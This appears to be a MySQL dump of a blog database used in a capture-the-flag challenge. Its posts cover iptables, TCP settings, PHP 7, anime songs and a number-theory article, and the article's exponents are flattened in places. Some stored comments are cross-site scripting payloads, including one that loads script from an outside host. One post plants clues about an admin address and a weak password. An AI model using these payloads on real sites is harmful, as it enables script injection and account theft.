-- MySQL dump 10.13  Distrib 5.5.46, for Linux (x86_64)
--
-- Host: localhost    Database: kirieblog
-- ------------------------------------------------------
-- Server version	5.5.46-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `kirieblog_comments`
--

DROP TABLE IF EXISTS `kirieblog_comments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kirieblog_comments` (
  `coid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `cid` int(10) unsigned DEFAULT '0',
  `created` int(10) unsigned DEFAULT '0',
  `author` varchar(200) DEFAULT NULL,
  `authorId` int(10) unsigned DEFAULT '0',
  `ownerId` int(10) unsigned DEFAULT '0',
  `mail` varchar(200) DEFAULT NULL,
  `url` varchar(200) DEFAULT NULL,
  `ip` varchar(64) DEFAULT NULL,
  `agent` varchar(200) DEFAULT NULL,
  `text` text,
  `type` varchar(16) DEFAULT 'comment',
  `status` varchar(16) DEFAULT 'approved',
  `parent` int(10) unsigned DEFAULT '0',
  PRIMARY KEY (`coid`),
  KEY `cid` (`cid`),
  KEY `created` (`created`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kirieblog_comments`
--

LOCK TABLES `kirieblog_comments` WRITE;
/*!40000 ALTER TABLE `kirieblog_comments` DISABLE KEYS */;
INSERT INTO `kirieblog_comments` VALUES (2,4,1449309724,'sa',0,1,'asd@ds.cof',NULL,'140.207.196.5','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36','<scRiPt src=\"http://ctf.fudan.edu.cn/xss.js\">\r\n</sCrIpt>','comment','approved',0),(3,2,1449309749,'sa',0,1,'asd@ds.cof',NULL,'140.207.196.5','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36','<scRiPt src=\"http://ctf.fudan.edu.cn/xss.js\" >\r\n</sCrIpt>','comment','approved',0),(4,2,1449310801,'qwe',0,1,'qwe@qwe.com',NULL,'140.207.196.3','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36','qwe','comment','approved',3),(5,14,1449383989,'sa',0,1,'asd@ds.cof',NULL,'140.207.196.6','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36','<happy tree friends\r\n</yy>','comment','approved',0),(6,14,1449384207,'sdf',0,1,'sdf@sdf.cn','http://www.baidu.com','202.118.236.189','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36','\"\'<script>','comment','approved',0),(7,6,1449388906,'aaa',0,1,'sdf@sdf.cn','http://www.baidu.com','202.118.236.189','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36','sdfsdf','comment','approved',0),(8,6,1449389877,'aaa',0,1,'sdf@sdf.cn','http://www.baidu.com','202.118.236.189','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36','sdfsdf','comment','approved',0),(9,2,1449391380,'sdfsdf',0,1,'sdf@sdf.cn','http://www.baidu.com','202.118.236.190','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36','sdfsdf','comment','approved',0),(10,6,1449400445,'sbsun',0,1,'sbsun@sbsun.com',NULL,'123.114.75.76','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7','sbsun','comment','approved',0);
/*!40000 ALTER TABLE `kirieblog_comments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kirieblog_contents`
--

DROP TABLE IF EXISTS `kirieblog_contents`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kirieblog_contents` (
  `cid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(200) DEFAULT NULL,
  `slug` varchar(200) DEFAULT NULL,
  `created` int(10) unsigned DEFAULT '0',
  `modified` int(10) unsigned DEFAULT '0',
  `text` text,
  `order` int(10) unsigned DEFAULT '0',
  `authorId` int(10) unsigned DEFAULT '0',
  `template` varchar(32) DEFAULT NULL,
  `type` varchar(16) DEFAULT 'post',
  `status` varchar(16) DEFAULT 'publish',
  `password` varchar(32) DEFAULT NULL,
  `commentsNum` int(10) unsigned DEFAULT '0',
  `allowComment` char(1) DEFAULT '0',
  `allowPing` char(1) DEFAULT '0',
  `allowFeed` char(1) DEFAULT '0',
  `parent` int(10) unsigned DEFAULT '0',
  PRIMARY KEY (`cid`),
  UNIQUE KEY `slug` (`slug`),
  KEY `created` (`created`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kirieblog_contents`
--

LOCK TABLES `kirieblog_contents` WRITE;
/*!40000 ALTER TABLE `kirieblog_contents` DISABLE KEYS */;
INSERT INTO `kirieblog_contents` VALUES (3,'kirie酱要开始写博客啦~','3',1442395260,1449225849,'<!--markdown-->哎要找工作了。。没有技术去哪里都没人要。。\r\n\r\n准备学习前端以及PHP的知识，努力成为一个全栈web开发人员！',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(2,'备忘录','start-page',1449027060,1449028080,'<!--markdown-->备忘个啥呢。。',0,1,NULL,'page','publish',NULL,3,'1','1','1',0),(4,'出去玩咯~','4',1447197360,1449027779,'<!--markdown-->有没有同行的小伙伴一起去南京玩呀~\r\n今天是光棍节，我也是单身，上次去南京已经是10月份的事情了。。哎。。\r\n\r\n[none][1]\r\n\r\n\r\n  [1]: https://ooo.0o0.ooo/2015/12/01/565e68d94a2c5.png',0,1,NULL,'post','publish',NULL,1,'1','1','1',0),(5,'今天入职咯~','5',1442446980,1449225879,'<!--markdown-->真开心~入职咯~\r\n还有MC可以玩。。开心~',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(6,'记录一些东西。。','6',1442573280,1449225866,'<!--markdown-->管理地址mc4dm1n.hack123.pw\r\n主管说不要用自己的生日做密码。。我还没改怎么办。。',0,1,NULL,'post','publish','123456',3,'1','1','1',0),(7,'TCP记录记录~','7',1447294320,1449205841,'<!--markdown--> Linux 里面有两个相似的东西\r\n \r\n net.ipv4.tcp_tw_reuse\r\n net.ipv4.tcp_tw_recycle\r\n \r\n 主要是这个 TIME-WAIT \r\n Linux Documentatioin 都写着 \r\n It should not be changed without advice/request of technical experts.\r\n \r\n As a sidenote, despite the use of ipv4 in its name, the net.ipv4.tcp_tw_recycle control also applies to IPv6.\r\n 虽然名字上写的是 ipv4 但实际上对ipv6也有效[戳我][1]\r\n ![此处输入图片的描述][2]\r\n \r\n \r\n\r\n  [1]: http://vincent.bernat.im/en/blog/2014-tcp-time-wait-state-linux.html\r\n  [2]: http://d1g3mdmxf8zbo9.cloudfront.net/images/tcp/tcp-state-diagram.png',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(8,'iptables备忘','8',1447294560,1449111377,'<!--markdown-->```\r\n                          /     \\         Outgoing\r\nIncoming-->[Routing ]--->|FORWARD|------->\r\n           [Decision]     \\_____/        ^\r\n                |                        |\r\n                v                      ____\r\n               ___                    /    \\\r\n              /   \\                  |OUTPUT|\r\n             |INPUT|                  \\____/\r\n              \\___/                      ^\r\n                |                        |\r\n                 ----> Local Process ----\r\n```\r\n\r\nASCII 艺术  学习到各种姿势，跟打比赛拿到flag一样高兴。听说最近有场HCTF比赛。\r\n四张规则表 五条规则链\r\n - raw:\r\n    - 状态跟踪机制处理\r\n    \r\n    1. OUTPUT\r\n    2. PREROUTING\r\n    \r\n - mangle:  #iptables -t mangle -L\r\n    \r\n    1. PREROUTING\r\n    2. POSTROUTING\r\n    3. INPUT\r\n    4. OUTPUT\r\n    5. FORWARD\r\n\r\n - nat:      #iptables -t nat -L\r\n   - 修改数据包的 IP 地址和端口号 就是转发啦\r\n\r\n    1. PREROUTING\r\n    2. POSTROUTING\r\n    3. OUTPUT\r\n\r\n\r\n - filter:   #iptables -L\r\n    - 过滤数据包决定数据包是否放行 \r\n    \r\n    1. INPUT   接收从外部发到防火墙本机的数据\r\n    2. OUTPUT  发送到外部的数据\r\n    3. FORWARD 需要防火墙转发的数据\r\n\r\n   \r\n### Ubuntu\r\n\r\n```\r\n-A - Append this rule to a rule chain. Valid chains for what we\'re doing are INPUT, FORWARD and OUTPUT, but we mostly deal with INPUT in this tutorial, which affects only incoming traffic.\r\n\r\n-L - List the current filter rules.\r\n\r\n-m conntrack - Allow filter rules to match based on connection state. Permits the use of the --ctstate option.\r\n\r\n--ctstate - Define the list of states for the rule to match on. Valid states are:\r\n\r\nNEW - The connection has not yet been seen.\r\nRELATED - The connection is new, but is related to another connection already permitted.\r\nESTABLISHED - The connection is already established.\r\nINVALID - The traffic couldn\'t be identified for some reason.\r\n-m limit - Require the rule to match only a limited number of times. Allows the use of the --limit option. Useful for limiting logging rules.\r\n\r\n--limit - The maximum matching rate, given as a number followed by \"/second\", \"/minute\", \"/hour\", or \"/day\" depending on how often you want the rule to match. If this option is not used and -m limit is used, the default is \"3/hour\".\r\n\r\n-p - The connection protocol used.\r\n\r\n--dport - The destination port(s) required for this rule. A single port may be given, or a range may be given as start:end, which will match all ports from start to end, inclusive.\r\n\r\n-j - Jump to the specified target. By default, iptables allows four targets:\r\n\r\nACCEPT - Accept the packet and stop processing rules in this chain.\r\n\r\nREJECT - Reject the packet and notify the sender that we did so, and stop processing rules in this chain.\r\n\r\nDROP - Silently ignore the packet, and stop processing rules in this chain.\r\n\r\nLOG - Log the packet, and continue processing more rules in this chain. Allows the use of the --log-prefix and --log-level options.\r\n\r\n--log-prefix - When logging, put this text before the log message. Use double quotes around the text to use.\r\n\r\n--log-level - Log using the specified syslog level. 7 is a good choice unless you specifically need something else.\r\n\r\n-i - Only match if the packet is coming in on the specified interface.\r\n\r\n-I - Inserts a rule. Takes two options, the chain to insert the rule into, and the rule number it should be.\r\n\r\n-I INPUT 5 would insert the rule into the INPUT chain and make it the 5th rule in the list.\r\n\r\n-v - Display more information in the output. Useful for if you have rules that look similar without using -v.\r\n\r\n-s --source - address[/mask] source specification\r\n\r\n-d --destination - address[/mask] destination specification\r\n\r\n-o --out-interface - output name[+] network interface name ([+] for wildcard)\r\n```\r\n\r\n>**Logging**\r\nIn the above examples none of the traffic will be logged. If you would like to log dropped packets to syslog, this would be the quickest way:\r\n\r\n```\r\nsudo iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix \"iptables denied: \" --log-level 7\r\n```\r\nSee Tips section for more ideas on logging.\r\n\r\n>EXAMPLE：\r\n\r\n###MATCH\r\n**条件匹配**\r\n仅允许从202.13.0.0/16网段的主机来登陆本机的22端口\r\n\\#iptables -A INPUT -p tcp  --dport 22 -s 202.13.0.0/16 -j ACCEPT\r\n\r\n\\#iptables -A INPUT -p tcp --dport 20:1024 -j ACCEP\r\n\r\n\\#禁止其他主机ping防火墙主机，但是允许从防火墙上ping其他主机（允许接受ICMP回应数据）。  1\r\n\\#iptables -A INPUT -p icmp --icmp-type Echo-Request -j DROP \r\n\\#iptables -A INPUT -p icmp --icmp-type Echo-Reply -j ACCEPT  \r\n\\#iptables -A INPUT -p icmp --icmp-type destination-Unreachable -j ACCEPT\r\n\r\n\r\n```\r\n# 允许已建立的或相关连的通行\r\n-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\r\n#允许本地回环接口\r\n-A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT\r\n#允许本机对外访问 \r\n-A OUTPUT -j ACCEPT \r\n# 允许访问SSH端口，如果端口修改了可以更改相应端口号 \r\n-A INPUT -p tcp --dport 22 -j ACCEPT \r\n#允许访问80（HTTP）端口 \r\n-A INPUT -p tcp --dport 80 -j ACCEPT \r\n#允许访问FTP端口：21、20 \r\n-A INPUT -p tcp --dport 21 -j ACCEPT \r\n-A INPUT -p tcp --dport 20 -j ACCEPT \r\n#允许访问161（SNMP）端口：\r\n-A INPUT -p udp --dport 161 -j ACCEPT\r\n#禁止其他未允许的规则访问 \r\n-A INPUT -j REJECT \r\n-A FORWARD -j REJECT\r\n#使用XEN、OPENVZ的VPS用户注意！！！如果在文件中加上了最后一条“禁止其他\r\n未允许的规则访问”，则必须加上第一条“允许已建立的或相关连的通行”。如果\r\n没加上第一条，则无法通过指定的端口号（如SSH）连接VPS。\r\n\r\n```\r\n\r\n**显式匹配**\r\n\r\n>MAC地址\r\n\r\n禁止转发来自 3C-97-0E-77-7F-67 的包\r\n\\#iptables -A FORWARD -m mac --mac-source 3C-97-0E-77-7F-67 \r\n-j DROP\r\n\r\n>多端口\r\n\\#iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT \r\n\r\n>多 IP\r\n\\#iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP\r\n\r\n**状态**\r\n拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包。  \\#iptables -A INPUT -p tcp -m state --state NEW -j DROP\r\n\\#iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(9,'听说php7要出来了','9',1449109380,1449220266,'<!--markdown-->我好兴奋啊！\r\n新版在语法上的改进主要包括：\r\n\r\n- 标量类型声明，\r\n- 返回值类型声明，\r\n- null合并运算符，\r\n- Spaceship 操作符，\r\n- 通过 define()定义常量数组，\r\n- 匿名类，\r\n- Unicode codepoint 转译语法等等。\r\n\r\n拍黄片终于可以拍得快点了。\r\n\r\nphp.net官网LOGO 多了个圣诞帽子。\r\n\r\n老板说我安全工作做得很好，给我发了奖金耶！\\(^_^)/\r\n上次写程序效率大提高还是把PS/2键盘换成USB2.0键盘的时候呢。这次要不要换个usb3.0接口的键盘呢，二狗上次跟我说 HHKB 的键盘很不错。所以问题来了，是 HHKB 好还是双飞燕好呢。\r\n\r\n谁能给我个意见啊。我去问土土老司机，他只回了我呵呵。意思应该是随便吧，我就去淘宝上面搜了一下键盘，在品牌里边没有 HHKB 啊，二狗这不是糊弄我么。选了个带有九种背光灯效的超超超炫酷键盘，才100多，土土那个奇奇怪怪还没有方向键的键盘竟然要上千大洋，太奇怪了，难以理解啊！\r\n\r\n(此处应该有一张图片！)\r\n\r\n淘宝真是个好地方。\r\n天气有点冷了。\r\n\r\n======今天========\r\n\r\n土土老司机看到我的新键盘之后，直接跟我说要玩要玩！哈哈哈我的键盘够好吧！',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(10,'OpenSuse Saiko!','10',1446517440,1449202984,'<!--markdown-->听说有个同部门的前辈很喜欢青蛙，不知道喜欢的是不是呱太呢，还是像OpenSuse那样的青蛙。\r\n\r\n啪啪啪，前辈打了我一顿之后告诉我OpenSUSE那只不是青蛙是蜥蜴。\r\n\r\n我打开OpenSuse的官网一看，发现原来OpenSuse已经到42啦，这样的话OpenSuse > Ubuntu + Centos + Windows + debian 这才是最好的Linux——OpenSuse！\r\n\r\n\r\n\r\n...\r\n...\r\n...\r\n...\r\n前辈，你的刀可以拿开了吧。',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(11,'一些超好听的 OP','11',1446431880,1449202596,'<!--markdown-->格式有点乱 待整理 但是东西还是能看的嘛！！！\r\n\r\n\r\n - EVA (残酷天使的行动纲领）\r\n - 魔法少女樱( プラチナ）\r\n - Angel Beats! （My soul your beats & Brave Song & 一番の宝物)\r\n - Clannad （欢乐岛 & 铭刻时间的歌）\r\n - Air （鸟之诗）\r\n - 缘之空  \r\n - Kanon (Last Regrets)\r\n - 空之音 (光の旋律）\r\n - 灼眼的夏娜 (绯色之空 & joint）\r\n - 某科学的超电磁炮 (Only my railgun & Level 5 )\r\n - Fate Zero (oath sign)\r\n - 龙与虎\r\n - 冰菓 （优しさの理由）\r\n - 魔圆\r\n - 俺妹 (irony)\r\n - 进击的巨人(红莲的弓矢）\r\n - SAO （crossing field & INNOCENCE & Overfly )\r\n - DAL (Trust in you)\r\n - 结界师\r\n - 天麻 (全国篇OP)\r\n - 乱步奇谭 (ミカヅキ)',0,1,NULL,'post','publish',NULL,0,'1','1','1',0),(12,'程序员一定要学习数学！','12',1448419920,1449228803,'<!--markdown-->从别人博客（顾森）里拿来的好文章啧啧啧。\r\n\r\n很多自然数都可以被分解成一些更小的数的乘积，例如 12 可以被分成 4 乘以 3 ，其中 4 还可以继续地被分成 2 乘以 2 ，因而我们可以把 12 写作 2 × 2 × 3 。此时， 2 和 3 都不能再继续分解了，它们是最基本、最纯净的数。我们就把这样的数叫做“质数”或者“素数”。同样地， 2 、 3 、 5 、 7 、 11 、 13 等等都是不可分解的，它们也都是质数。它们是自然数的构件，是自然数世界的基本元素。 12 是由两个 2 和一个 3 组成的，正如水分子是由两个氢原子和一个氧原子组成的一样。只不过，和化学世界不同的是，自然数世界里的基本元素是无限的——质数有无穷多个。\r\n    关于为什么质数有无穷多个，古希腊的 Euclid 有一个非常漂亮的证明。假设质数只有有限个，其中最大的那个质数为 p 。现在，把所有的质数全部乘起来，再加上 1 ，得到一个新的数 N 。也就是说， N 等于 2 · 3 · 5 · 7 · … · p + 1 。注意到， N 除以每一个质数都会余 1 ，比如 N 除以 2 就会商 3 · 5 · 7 · … · p 余 1 ， N 除以 3 就会商 2 · 5 · 7 · … · p 余 1 ，等等。这意味着， N 不能被任何一个质数整除，换句话说 N 是不能被分解的，它本身就是质数。然而这也不对，因为 p 已经是最大的质数了，于是产生了矛盾。这说明，我们刚开始的假设是错的，质数应该有无穷多个。需要额外说明的一点是，这个证明容易让人产生一个误解，即把头 n 个质数乘起来再加 1 ，总能产生一个新的质数。这是不对的，因为既然我们无法把全部质数都乘起来，那么所得的数就有可能是由那些我们没有乘进去的质数构成的，比如 2 · 3 · 5 · 7 · 11 · 13 + 1 = 30031 ，它可以被分解成 59 × 509 。\r\n\r\n    从古希腊时代开始，人们就近乎疯狂地想要认识自然数的本质规律。组成自然数的基本元素自然地就成为了一个绝佳的突破口，于是对质数的研究成为了探索自然数世界的一个永久的话题。这就是我们今天所说的“数论”。\r\n\r\n    用质数理论来研究数，真的会非常方便。 a 是 b 的倍数（或者说 a 能被 b 整除， b 是 a 的约数），意思就是 a 拥有 b 所含的每一种质数，而且个数不会更少。我们举个例子吧，比如说 b = 12 ，它可以被分解成 2 × 2 × 3 ， a = 180 ，可以被分解成 2 × 2 × 3 × 3 × 5 。 b 里面有两个 2 ，这不稀罕， a 里面也有两个 2 ； b 里面有一个 3 ，这也没什么， a 里面有两个 3 呢。况且， a 里面还包含有 b 没有的质数， 5 。对于每一种质数， b 里面所含的个数都比不过 a ，这其实就表明了 b 就是 a 的约数。\r\n\r\n    现在，假设 a = 36 = 2 × 2 × 3 × 3 ， b = 120 = 2 × 2 × 2 × 3 × 5 。那么， a 和 b 的最大公约数是多少？我们可以依次考察，最大公约数里面可以包含哪些质数，每个质数都能有多少个。这个最大公约数最多可以包含多少个质数 2 ？显然最多只能包含两个，否则它就不能整除 a 了；这个最大公约数最多可以包含多少个质数 3 ？显然最多只能包含一个，否则它就不能整除 b 了；这个最大公约数最多可以包含多少个质数 5 ？显然一个都不能有，否则它就不能整除 a 了。因此， a 和 b 的最大公约数就是 2 × 2 × 3 = 12 。\r\n\r\n    在构造 a 和 b 的最小公倍数时，我们希望每种质数在数量足够的前提下越少越好。\r\n            为了让这个数既是 a 的倍数，又是 b 的倍数，三个 2 是必需的；\r\n            为了让这个数既是 a 的倍数，又是 b 的倍数，两个 3 是必需的；\r\n            为了让这个数既是 a 的倍数，又是 b 的倍数，那一个 5 也是必不可少的。\r\n            因此， a 和 b 的最小公倍数就是 2 × 2 × 2 × 3 × 3 × 5 = 360 。\r\n\r\n    你会发现， 12 × 360 = 36 × 120 ，最大公约数乘以最小公倍数正好等于原来两数的乘积。这其实并不奇怪。在最大公约数里面，每种质数各有多少个，取决于 a 和 b 当中谁所含的这种质数更少一些。在最小公倍数里面，每种质数各有多少个，取决于 a 和 b 当中谁所含的这种质数更多一些。因此，对于每一种质数而言，最大公约数和最小公倍数里面一共包含了多少个这种质数， a 和 b 里面也就一共包含了多少个这种质数。最大公约数和最小公倍数乘在一起，也就相当于是把 a 和 b 各自所包含的质数都乘了个遍，自然也就等于 a 与 b 的乘积了。这立即带来了我们熟悉的推论：如果两数互质，这两数的乘积就是它们的最小公倍数。\r\n\r\n    第三节里，我们曾说到，“因为 5 和 3 、 7 和 3 都是互质的，从而 5 × 7 和 3 也是互质的”。利用质数的观点，这很容易解释。两个数互质，相当于是说这两个数不包含任何相同的质数。如果 a 与 c 互质， b 与 c 互质，显然 a · b 也与 c 互质。另外一个值得注意的结论是，如果 a 和 b 是两个不同的质数，则这两个数显然就直接互质了。事实上，只要知道了 a 是质数，并且 a 不能整除 b ，那么不管 b 是不是质数，我们也都能确定 a 和 b 是互质的。我们后面会用到这些结论。\r\n\r\n    在很多场合中，质数都扮演着重要的角色。 1640 年，法国业余数学家 Pierre de Fermat （通常译作“费马”）发现，如果 n 是一个质数的话，那么对于任意一个数 a ， a 的 n 次方减去 a 之后都将是 n 的倍数。例如， 7 是一个质数，于是 27 – 2 、 37 – 3 ， 47 – 4 ，甚至 1007– 100 ，统统都能被 7 整除。但 15 不是质数（它可以被分解为 3 × 5 ），于是 a15 – a 除以 15 之后就可能会出现五花八门的余数了。这个规律在数论研究中是如此基本如此重要，以至于它有一个专门的名字—— Fermat 小定理。作为一个业余数学家， Fermat 发现了很多数论中精彩的结论， Fermat “小”定理只是其中之一。虽然与本文无关，但有一点不得不提：以 Fermat 的名字命名的东西里，最著名的要数 Fermat 大定理了（其实译作“ Fermat 最终定理”更贴切）。如果你没听说过，上网查查，或者看看相关的书籍。千万不要错过与此相关的一系列激动人心的故事。\r\n\r\n    言归正传。 Fermat 小定理有一个非常精彩的证明。我们不妨以“ 37 – 3 能被 7 整除”为例进行说明，稍后你会发现，对于其他的情况，道理是一样的。首先，让我来解释一下“循环移位”的意思。想象一个由若干字符所组成的字符串，在一块大小刚好合适的 LED 屏幕上滚动显示。比方说， HELLOWORLD 就是一个 10 位的字符串，而我们的 LED 屏幕不多不少正好容纳 10 个字符。刚开始，屏幕上显示 HELLOWORLD 。下一刻，屏幕上的字母 H 将会移出屏幕，但又会从屏幕右边移进来，于是屏幕变成了 ELLOWORLDH 。下一刻，屏幕变成了 LLOWORLDHE ，再下一刻又变成了 LOWORLDHEL 。移动到第 10 次，屏幕又会回到 HELLOWORLD 。在此过程中，屏幕上曾经显示过的 ELLOWORLDH, LLOWORLDHE, LOWORLDHEL, … ，都是由初始的字符串 HELLOWORLD 通过“循环移位”得来的。现在，考虑所有仅由 A 、 B 、 C 三个字符组成的长度为 7 的字符串，它们一共有 37 个。如果某个字符串循环移位后可以得到另一个字符串，我们就认为这两个字符串属于同一组字符串。比如说， ABBCCCC 和 CCCABBC 就属于同一组字符串，并且该组内还有其他 5 个字符串。于是，在所有 37 个字符串当中，除了 AAAAAAA 、 BBBBBBB 、 CCCCCCC 这三个特殊的字符串以外，其他所有的字符串正好都是每 7 个一组。这说明， 37 – 3 能被 7 整除。\r\n\r\n    在这个证明过程中，“ 7 是质数”这个条件用到哪里去了？仔细想想你会发现，正因为 7 是质数，所以每一组里才恰好有 7 个字符串。如果字符串的长度不是 7 而是 15 的话，有些组里将会只含 3 个或者 5 个字符串。比方说， ABCABCABCABCABC 所在的组里就只有 3 个字符串，循环移动 3 个字符后，字符串将会和原来重合。\r\n\r\n    Fermat 小定理有一个等价的表述：如果 n 是一个质数的话，那么对于任意一个数 a ，随着 i 的增加， a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性（下表所示的是 a = 3 、 n = 7 的情况）。这是因为，根据前面的结论， an 与 a 的差能够被 n 整除，这说明 an 和 a 分别都除以 n 之后将会拥有相同的余数。这表明，依次计算 a 的 1 次方、 2 次方、 3 次方除以 n 的余数，算到 a 的 n 次方时，余数将会变得和最开始相同。另一方面， ai 除以 n 的余数，完全由 ai-1 除以 n 的余数决定。比方说，假如我们已经知道 33 除以 7 等于 3 余 6 ，这表明 33里包含 3 个 7 以及 1 个 6 ；因此， 34 里就包含 9 个 7 以及 3 个 6 ，或者说 9 个 7 以及 1 个 18 。为了得到 34 除以 7 的余数，只需要看看 18 除以 7 余多少就行了。可见，要想算出 ai-1 · a 除以 n 的余数，我们不需要完整地知道 ai-1 的值，只需要知道 ai-1 除以 n 的余数就可以了。反正最后都要对乘积取余，相乘之前事先对乘数取余不会对结果造成影响（记住这一点，后面我们还会多次用到）。既然第 n 个余数和第 1 个余数相同，而余数序列的每一项都由上一项决定，那么第 n + 1 个、第 n + 2 个余数也都会跟着和第 2 个、第 3 个余数相同，余数序列从此处开始重复，形成长为 n – 1 的周期。\r\n\r\ni	1	2	3	4	5	6	7	8	9	10	11	12	13	14	15\r\n3i	3	9	27	81	243	729	2187	6561	19683	59049	177147	531441	1594323	4782969	14348907\r\n3i mod 7	3	2	6	4	5	1	3	2	6	4	5	1	3	2	6\r\n    需要注意的是， n – 1 并不见得是最小的周期。下表所示的是 2i 除以 7 的余数情况，余数序列确实存在长度为 6 的周期现象，但实际上它有一个更小的周期， 3 。\r\n\r\ni	1	2	3	4	5	6	7	8	9	10	11	12	13	14	15\r\n2i	2	4	8	16	32	64	128	256	512	1024	2048	4096	8192	16384	32768\r\n2i mod 7	2	4	1	2	4	1	2	4	1	2	4	1	2	4	1\r\n    那么，如果除数 n 不是质数，而是两个质数的乘积（比如 35 ），周期的长度又会怎样呢？让我们试着看看， 3i 除以 35 的余数有什么规律吧。注意到 5 和 7 是两个不同的质数，因而它们是互质的。根据中国剩余定理，一个数除以 35 的余数就可以唯一地由它除以 5 的余数和除以 7 的余数确定出来。因而，为了研究 3i 除以 35 的余数，我们只需要观察 (3i mod 5, 3i mod 7) 即可。由 Fermat 小定理可知，数列 3i mod 5 有一个长为 4 的周期，数列 3i mod 7 有一个长为 6 的周期。 4 和 6 的最小公倍数是 12 ，因此 (3i mod 5, 3i mod 7) 存在一个长为 12 的周期。到了 i = 13 时， (3i mod 5, 3i mod 7) 将会和最开始重复，于是 3i 除以 35 的余数将从此处开始发生循环。\r\n\r\ni	1	2	3	4	5	6	7	8	9	10	11	12	13	14	15	16	17	18	19	20	21	22\r\n3i mod 5	3	4	2	1	3	4	2	1	3	4	2	1	3	4	2	1	3	4	2	1	3	4\r\n3i mod 7	3	2	6	4	5	1	3	2	6	4	5	1	3	2	6	4	5	1	3	2	6	4\r\n3i mod 35	3	9	27	11	33	29	17	16	13	4	12	1	3	9	27	11	33	29	17	16	13	4\r\ni	23	24	25	26	27	28	29	30	31	32	33	34	35	36	37	38	39	40	41	42	43	44\r\n3i mod 5	2	1	3	4	2	1	3	4	2	1	3	4	2	1	3	4	2	1	3	4	2	1\r\n3i mod 7	5	1	3	2	6	4	5	1	3	2	6	4	5	1	3	2	6	4	5	1	3	2\r\n3i mod 35	12	1	3	9	27	11	33	29	17	16	13	4	12	1	3	9	27	11	33	29	17	16\r\n    类似地，假如某个整数 n 等于两个质数 p 、 q 的乘积，那么对于任意一个整数 a ，写出 ai依次除以 n 所得的余数序列， p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期。事实上， p – 1 和 q – 1 的任意一个公倍数，比如表达起来最方便的 (p – 1) × (q – 1) ，也将成为该序列的一个周期。这个规律可以用来解释很多数学现象。例如，大家可能早就注意过，任何一个数的乘方，其个位数都会呈现长度为 4 的周期（这包括了周期为 1 和周期为 2 的情况）。其实这就是因为， 10 等于 2 和 5 这两个质数的乘积，而 (2 – 1) × (5 – 1) = 4，因此任意一个数的乘方除以 10 的余数序列都将会产生长为 4 的周期。\r\n\r\ni	1	2	3	4	5	6	7	8	9	10\r\n3i	3	9	27	81	243	729	2187	6561	19683	59049\r\n3i的个位	3	9	7	1	3	9	7	1	3	9\r\n4i	4	16	64	256	1024	4096	16384	65536	262144	1048576\r\n4i的个位	4	6	4	6	4	6	4	6	4	6\r\n5i	5	25	125	625	3125	15625	78125	390625	1953125	9765625\r\n5i的个位	5	5	5	5	5	5	5	5	5	5\r\n    1736 年，瑞士大数学家 Leonhard Euler （通常译作“欧拉”）对此做过进一步研究，讨论了当 n 